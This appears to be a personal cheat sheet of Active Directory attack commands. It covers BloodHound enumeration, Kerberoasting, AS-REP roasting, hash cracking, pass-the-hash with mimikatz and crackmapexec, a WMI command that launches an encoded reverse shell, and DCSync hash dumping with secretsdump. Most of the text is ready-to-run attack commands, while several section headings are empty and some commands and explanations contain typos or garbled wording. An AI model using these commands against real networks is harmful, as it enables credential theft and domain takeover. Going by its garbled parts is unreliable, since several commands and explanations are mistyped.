
**NTDS.DIT file** — The NTDS.DIT file is a database that stores Active Directory data, including the password hashes for all users in the domain by default its found in  `C:\Windows\NTDS\`

- BloodHound
```sh
#On the target Machine
sharphound.exe -c -all -d $domain --domaincontroller $ip

#back to our attacker machine
#copy the zip file to the attacker machine
neo4j start

./Bloodhound

#drag and drop the zip 

```

### Kerboroasting 

**SPN = Service Principal Name**

- It’s basically a **unique identifier** that tells An SPN maps a **service** (like MSSQL, HTTP, CIFS, LDAP) to the user or computer account running it.

GetUserSPNs.py:

```sh
GetUserSPNs.py -request -dc-ip $ip <domain_name>/<domain_user>:<password>

#To get TGS ticket
GetUserSPNs.py -dc-ip $ip INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

With Rubeus:

```
.\Rubeus.exe kerberoast 
```



Cracking with dictionary of passwords:

```
hashcat -m 13100 --force <TGSs_file> <wordlist>

john --format=krb5tgs --wordlist=<wordlist> <AS_REP_responses_file>
```

psexec 
```
psexec.py <domain_name>/<domain_user>@<domain_ip>
```


### Golden Ticket

### ASREPRoast

Kerbrute
```
kerbrute userenum --dc spookysec.local -d spookysec.local users.txt --downgrade
```
GetNPUsers.py

```
GetNPUsers.py -dc-ip <ip> -usersfile users.txt 
<domain_name>
```

With Rubeus:

```
# check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast /outfile:<Out>
```

Cracking with dictionary of passwords:

```
hashcat -m 18200 -a 0 <AS_Response_Hash> <wordlist> --force
```

### Silver ticket

### Pass The Hash

Pass the Hash is a technique in which attackers use a stolen password hash to authenticate as a user without knowing the actual password. Instead of cracking the NT hash, they pass it to another system that accepts the password hash for authentication. This lets the attackers move laterally through a network, accessing systems as the compromised user.

```
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

```
Invoke-WMIexec -Target <computer_name> -Username user -Hash <NTML_HASH>  -Command "powershell -e <reversehell_Base74>"
```

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
### Pass The Ticket
### Harvest tickets from Windows

### Password Spraying

### DcSync

Active Directory environments typically include multiple domain controllers, which needs to sync it could be simply a backup server. some applications, including Azure Active Directory Connect, need replication permissions. In a DCSync attack, a hacker who has gained access to a privileged account with grant a service account “Replicate Directory Changes All” this AD functionality by pretending to be a DC and requesting password hashes from a legitimate DC.


lsadump
```
lsadumnp::dcsync /domain:<doimain_name> /user:<>
```


secretsdump
```
secretsdump.py '<domain_name>'/'<domain_user>':'<domain_user_password>'@
'<domain_ip>'
```

psexec
```
psexec <domain_user>@<domain_ip> -hashes <user_hash>
```

OR
smbexec  
```
 smbexec <domain_user>@<domain_ip> -hashes <user_hash>
```

OR

wmiexec
```
wmiexec <domain_user>@<domain_ip> -hashes <user_hash>
```
